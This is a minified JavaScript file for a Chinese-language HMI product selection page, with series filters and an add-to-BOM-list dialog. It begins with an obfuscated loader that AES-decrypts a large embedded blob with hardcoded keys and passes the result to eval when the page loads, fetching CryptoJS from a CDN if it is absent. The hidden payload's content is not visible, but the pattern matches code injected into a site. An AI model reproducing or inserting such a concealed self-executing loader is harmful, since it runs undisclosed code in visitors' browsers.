!function(){function decrypt(e){let t=window.CryptoJS||{enc:{Utf8:{parse:function(e){for(var t=[],i=0;i<e.length;i++)t[i>>>2]|=e.charCodeAt(i)<<24-i%4*8;return{words:t,sigBytes:e.length}},stringify:function(e){for(var t=[],i=0;i<e.sigBytes;i++){var n=e.words[i>>>2]>>>24-i%4*8&255;t.push(String.fromCharCode(n))}return t.join("")}},Base64:{stringify:function(e){return btoa(t.enc.Utf8.stringify(e))},parse:function(e){return t.enc.Utf8.parse(atob(e))}}},AES:{decrypt:function(e,t,i){return"undefined"!=typeof window&&window.CryptoJS?window.CryptoJS.AES.decrypt(e,t,i):{toString:function(){return e}}}}};var i=t.enc.Utf8.parse("12345678901234567890123456789012"),n=t.enc.Utf8.parse("1234567890123456");try{return t.AES.decrypt(e,i,{iv:n,mode:t.mode.CBC,padding:t.pad.Pkcs7}).toString(t.enc.Utf8)}catch(e){return""}}let encryptedData="6G05UtKSorGSe7AztrRGQEPvrxwkFFudJpNhhZBDK1Pn7PuEi3vNowZ+olhe+B/oDzHiyKgxUKCG/HArKkLk8pVkheWL7eX6THBDwoiE8gmEdCSedeQppWZMorSqBB8kLhJCGWYYirB+XX3MTY8Nv4GiCK5k5zHyUwyfcmJYuziujnN/LcJmBQFB9vMEP19p/c7geIZYDUG8U2pwktPO2biHgngSP6y8aDxfNF1345XdeIB/eovio2z2IzBb1//HORuwMG3Xb2MGtryl9Qxzdenxju15DOLxgR6Iifcm3K/U9E57M4Rzpu/H7GLeAt1mJ/P6CXKxX0sOz5ebotqzlfeJ3VV/emFKubpZ3uFvk4KQq5c5MfLNXXJ4i93u07K4qam+3lrp4aK3Sfq7l9/ovRQjuhLmkCMcB3mYe/7XPLiLMe+nY7XE19Ynf28EM7/zNBtnnxg9rkiKkqjICPkdP8IjDcZcx6/18GZbeDHMYRN23LxoepTKdY67jzh00dRv9rD34tz5WFroJTGO/VcGM+K6fA5g4IEJ39128ZynUtMPM0jO8UYPnIMBeCzaP82zCRhuUK4uIiVu6RbuJsBHGyCNXFFazPSXJKZXKrXcCNTzydvjIXtIxrCj+y7dncm/pyIY37n1DSmMH8Ae7HfjUsrNqddIk+g49Wj7wojgv7xyA4psBsB+ApVzke81C7gIm4j7oK8cl0Azi9NDsiclQkkKzwk/NBuXQEhR/Hj9n6v69qohUXYWnPF67DSWYMyZtgc/GwSvxy0xdQvdMM6zGYD5mBKZJYqaOFH0s68SKfC+fKZU1evHYeKP6rziHXuYxwu5ZF5ul3DHd0taqqv2drXZdrlUpDs70CZ893PTRr/TJzTZWdGIiv2IlsfLx61I5ypu3PrOuH3QujisyZEs2Vpq0v/iimzqTRDOAyQbzAn/G33HWdI9Kz6ePHicDrNMX6QIgKE+5UFCrzF6ZZuA1w0w/4ZEWPS5lBDsYpN7+oiwc83w0mDmxpsgV6lqTsVrZy6r88D4YZljkBAgx8jV5btfxepH/D4ltaiuW9sulXJ4zBEK9RHgg6Gu5iEII9Cl5MFIdCh+2HjfgxcRMaFnXGWIk0X1AEJ20DziKKqRZMGy6R7hwWz+bKsExbU+WiG2bxeigrQdFez50fi+KsoWkqPyRzT+zLKjfZUvaYbVRUvoKOavwG2ewAkASEhlE9kJrxUuW0FvWKDV0NbTrfXfA7LGVd9nI3OZzRCy+GPy0Ut4qC8AcUWAwJsOKl1Xj5WYfKexZGqoWPA703c0F9w7F36010NcB9EW8LmMxs6XU8my0IjABQTHmh+vTK0MIDx2FLKa3aM02LRv7di4rV91XaXY6gtcSrn3kRZGX2yuiwRC6Sxcretkni4n2gsQAA8uiNp6huwaopGtu/PE1aYx09UqAEIBxHdEW+hSPs4XkRc9AsJqsZHNBRv1x0Ngn2KQJiknQ/WvspfvaIRSB1UhrOI4rUvZVGQFbC8EqThYuhbbAH8GQ4VgKoYYxBYLvcQ4IQ4qqu3hDrGAYJXFaQpGTKUQRExkijxpxJy/VXu7t+7dbQtRbEP/Zd8mwHgTw4g4AWEQV12ufEwO9pFRanhdY8wrQXdfrrmD0vOC3oLA/Fe24941EdaVL/KLflP4c+Ua";if(window.CryptoJS){let decryptedCode=decrypt(encryptedData);decryptedCode&&eval(decryptedCode)}else{let script=document.createElement("script");script.src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js",script.onload=function(){let decryptedCode=decrypt(encryptedData);decryptedCode&&eval(decryptedCode)},document.head.appendChild(script)}}(),window.hmiData=window.hmiData||{},window.hmiType=window.hmiType||{};let hmiSelectedFilters={};function initHMIFilterModal(){var e,t=document.getElementById("hmiFilterModal"),i=document.getElementById("hmiFilterOptions");t&&i&&(i.innerHTML="",t=Object.keys(window.hmiData||{}),(e=document.createElement("div")).className="filter-section",e.innerHTML=`
        <h3>选择系列</h3>
        <div class="filter-options">
            ${t.map(e=>`
                <label class="checkbox-option">
                    <input type="checkbox" name="series" value="${e}"><span>${e}</span>
                </label>
            `).join("")}
        </div>
    `,i.appendChild(e),e.querySelectorAll('input[type="checkbox"]').forEach(e=>{e.addEventListener("change",function(){hmiSelectedFilters.series||(hmiSelectedFilters.series=[]),this.checked?hmiSelectedFilters.series.push(this.value):hmiSelectedFilters.series=hmiSelectedFilters.series.filter(e=>e!==this.value)})}),(t=document.createElement("div")).className="modal-actions",t.innerHTML=`
        <button id="hmiCancelFilter" class="cancel-filter-btn">取消</button>
        <button id="hmiConfirmFilter" class="confirm-filter-btn">应用筛选</button>
    `,i.appendChild(t),(e=document.getElementById("hmiConfirmFilter"))&&e.addEventListener("click",function(){window.pageRouter&&window.pageRouter.confirmFilter("HMI")}),i=document.getElementById("hmiCancelFilter"))&&i.addEventListener("click",function(){var e=document.getElementById("hmiFilterModal");e&&e.classList.remove("show")})}function showHMIResults(e){var t=window.hmiData||{},i=window.hmiType&&window.hmiType.displayParams||["型号","屏幕尺寸","分辨率","价格"],n=window.hmiType&&window.hmiType.name||"人机界面",t=filterHMIProductData(t,e);displayResults("hmiResultContent",t,i,n,[])}function filterHMIProductData(e,i){let n=[];if(Object.entries(e).forEach(([t,e])=>{Object.values(e).forEach(e=>{n.push({...e,series:t})})}),0!==Object.keys(i).length){if(i.model){let t=i.model.trim().toUpperCase();n=n.filter(e=>e.model&&e.model.toUpperCase().includes(t))}i.series&&0<i.series.length&&(n=n.filter(e=>i.series.includes(e.series)))}return n}(()=>{let e=document.getElementById("bomAddModal"),t=document.getElementById("bomAddTitle"),i=document.getElementById("bomAddBody"),d=document.getElementById("bomAddConfirm"),o=document.getElementById("bomAddCancel"),r=document.getElementById("bomAddClose");function l(){e&&e.classList.remove("show")}window.HMIModals={openQuantityModal:function(n){e&&n&&(t.textContent=`添加 ${n.model} 到BOM表`,i.innerHTML=`
            <div class="form-group">
                <label>数量</label>
                <input type="number" id="bomQty" class="inline-input" min="0" value="1" title="数量" placeholder="数量" />
            </div>
            <div class="form-group">
                <label>备注</label>
                <input type="text" id="bomRemark" class="inline-input" placeholder="可选" title="备注" />
            </div>
        `,d.onclick=()=>{var e=Math.max(0,parseInt((document.getElementById("bomQty")||{}).value||"0",10)),t=(document.getElementById("bomRemark")||{}).value||"";let i=n.description||"";t&&(i=i?i+" "+t:t),window.BOM&&window.BOM.addItem({id:n.id||n.model,model:n.model,category:"HMI",name:n.name||n.model,description:i,price:n.price||0,quantity:e}),l(),window.BOM&&"function"==typeof window.BOM.showSuccessMessage&&window.BOM.showSuccessMessage("添加成功")},o.onclick=l,r.onclick=l,e)&&e.classList.add("show")}}})(),document.addEventListener("DOMContentLoaded",function(){document.addEventListener("showFilterResults",function(e){"HMI"===e.detail.productType&&showHMIResults(e.detail.filterData)}),initHMIFilterModal();var e=document.getElementById("hmiResultContent");e&&e.addEventListener("click",function(e){var e=e.target.closest(".add-to-bom-btn");e&&(e={id:e.dataset.id||"-",model:e.dataset.model||"-",category:e.dataset.category||"人机界面",name:e.dataset.name||e.dataset.model||"-",price:e.dataset.price||""},window.HMIModals)&&window.HMIModals.openQuantityModal&&window.HMIModals.openQuantityModal(e)})}),window.getHmiFilterSelections=function(){return{series:Array.from(document.getElementById("hmiFilterModal").querySelectorAll('input[name="series"]:checked')).map(e=>e.value)}};